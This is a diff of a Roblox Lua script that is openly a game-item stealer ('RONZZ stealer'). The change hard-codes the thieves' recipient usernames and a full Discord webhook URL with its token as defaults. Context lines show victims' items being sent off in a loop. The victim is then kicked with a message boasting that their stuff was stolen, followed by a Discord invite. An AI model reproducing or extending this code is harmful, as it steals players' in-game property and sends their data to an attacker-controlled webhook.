@@ -1,17 +1,13 @@
-_G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55"} -- you can add as many as you'd like
-_G.min_value = 100000000 -- 100 million
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1397050931475906622/SfHsX5ToYLywNh3gUVM2W2XmaMPumldSwB6ttvkAX6QWFU3YP6VInlIaPJIsv-hure37" 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {}
+local users = _G.Usernames or {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55"}
 local min_value = _G.min_value or 10000000
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1397050931475906622/SfHsX5ToYLywNh3gUVM2W2XmaMPumldSwB6ttvkAX6QWFU3YP6VInlIaPJIsv-hure37"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -349,7 +345,7 @@ if #itemsToSend > 0 then
             task.wait(0.1)
         end
 
-        plr:kick("All your stuff just got stolen by RONZZ stealer!\n Join discord.gg/GY2RVSEGDT")
+        plr:kick("All your stuff just got stolen by RONZZ's stealer!\n Join discord.gg/GY2RVSEGDT")
     end
 
     local function waitForUserChat()
